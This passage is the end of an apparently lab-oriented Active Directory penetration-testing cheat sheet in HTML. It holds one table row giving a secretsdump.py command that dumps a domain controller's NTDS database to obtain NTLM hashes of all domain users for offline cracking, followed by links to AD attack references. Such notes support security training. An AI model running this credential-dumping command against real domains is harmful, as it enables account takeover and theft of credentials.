-<td>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT&#x2F;<a href="mailto:&#97;&#100;&#x75;&#x6e;&#110;&#x40;&#49;&#x37;&#x32;&#46;&#49;&#54;&#46;&#53;&#x2e;&#53;">&#97;&#100;&#x75;&#x6e;&#110;&#x40;&#49;&#x37;&#x32;&#46;&#49;&#54;&#46;&#53;&#x2e;&#53;</a> -use-vss</td>
-<td>Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking</td>
-</tr>
-</tbody></table>
-<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide">https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a></p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411">https:&#x2F;&#x2F;medium.com&#x2F;@awabrajpoot88&#x2F;active-directory-inital-attack-vectors-2-8479bed79411</a></p>
-
       
     </div>
     
